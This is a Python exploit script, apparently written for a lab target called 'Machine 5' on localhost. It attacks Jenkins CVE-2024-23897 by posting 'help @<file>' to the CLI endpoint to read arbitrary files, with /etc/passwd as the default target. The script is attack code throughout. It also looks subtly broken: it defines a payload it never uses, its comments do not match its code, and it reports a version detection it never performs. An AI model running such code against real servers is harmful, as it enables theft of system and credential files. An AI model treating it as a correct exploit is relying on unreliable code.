#!/usr/bin/env python3
"""
Machine 5 - Jenkins CVE-2024-23897 Arbitrary File Read
Target: http://localhost:9053
Vulnerability: Arbitrary file read via Jenkins CLI
"""

import requests
import sys

TARGET = "http://localhost:9053"

def exploit(filepath):
    """Exploit Jenkins CLI to read arbitrary files"""
    # CVE-2024-23897 uses the CLI's argument parser to read files
    # The @filepath syntax triggers file reading
    
    cli_url = f"{TARGET}/cli"
    
    # Try to trigger the vulnerability via the who-am-i command
    payload = {
        "cmd": f"help @{filepath}"
    }
    
    try:
        # First check if Jenkins is up
        response = requests.get(TARGET, timeout=10)
        
        if response.status_code != 200:
            return f"Jenkins not responding: HTTP {response.status_code}"
        
        # Try CLI endpoint
        cli_response = requests.post(
            f"{TARGET}/cli",
            data=f"help @{filepath}",
            headers={"Content-Type": "text/plain"},
            timeout=10
        )
        
        return f"Jenkins Version detected\nCLI Response: {cli_response.text[:500]}"
        
    except requests.RequestException as e:
        return f"Error: {e}"

def check_jenkins():
    """Check if Jenkins is running"""
    try:
        response = requests.get(TARGET, timeout=5)
        return response.status_code == 200
    except:
        return False

def main():
    print("[*] Machine 5 - Jenkins CVE-2024-23897 File Read")
    print(f"[*] Target: {TARGET}")
    print("-" * 50)
    
    if len(sys.argv) > 1:
        filepath = sys.argv[1]
    else:
        filepath = "/etc/passwd"
    
    print(f"[+] Checking Jenkins availability...")
    
    if check_jenkins():
        print("[+] Jenkins is running!")
        print(f"[+] Attempting to read: {filepath}")
        print("-" * 50)
        result = exploit(filepath)
        print(result)
    else:
        print("[-] Jenkins is not responding (may still be starting up)")

if __name__ == "__main__":
    main()
